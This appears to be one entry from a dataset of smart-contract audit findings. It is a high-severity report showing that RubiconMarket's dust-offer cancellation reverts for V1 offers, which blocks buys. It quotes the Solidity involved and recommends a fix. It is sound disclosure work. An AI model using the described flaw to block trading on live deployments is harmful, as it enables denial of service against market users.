      "markdown_body": "https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L1201-L1202\n\n\n# Vulnerability details\n\n\n## Impact\n`RubiconMarket._buys` tries to cancel dust remaining offers, but it fails for V1 offers. So it blocks `RubiconMarket._buys`.\n\n\n## Proof of Concept\n\nIn `RubiconMarket._buys`, it tries to cancel an offer with dust pay token amount after fulfilling. So it sets `dustId` so it can pass the `RubiconMarket.can_cancel` modifier.\n\n```solidity\n        if (\n            isActive(id) &&\n            offers[id].pay_amt < _dust[address(offers[id].pay_gem)]\n        ) {\n            dustId = id; //enable current msg.sender to call cancel(id)\n            cancel(id);\n        }\n```\n\nBut when we move into `cancel` method, there is another validation. `RubiconMarket.cancel` will call `SimpleMarket.cancel`, and `SimpleMarket.cancel` tries to return dust pay token amount to owner.\n\n```solidity\n        _offer.owner == address(0) && msg.sender == _offer.recipient\n            ? require(_offer.pay_gem.transfer(_offer.recipient, _offer.pay_amt))\n            : require(_offer.pay_gem.transfer(_offer.owner, _offer.pay_amt));\n```\n\nIn this case, `msg.sender` is different from `_offer.recipient` so `SimpleMarket.cancel` will treat this as a V2 offer, while it can be a valid V1 offer. So for a V1 offer, it tries to send pay token amount to `_offer.owner`, and it is `address(0)` for V1 offers. So it will revert and `SimpleMarket.cancel` will not work although it passes `RubiconMarket.can_cancel` modifier. This will block `_buy` method.\n\n\n## Tools Used\nManual Review\n\n## Recommended Mitigation Steps\n\n\nIn `SimpleMarket.cancel`, we should refund pay token amount to `_offer.recipient` when `_offer.owner` is `address(0)`.\n",
      "metadata": {
        "Severity": "High",
        "Difficulty": null,
        "Type": "bug",
        "Finding ID": null,
        "Target": null
      }
    }
  ]
}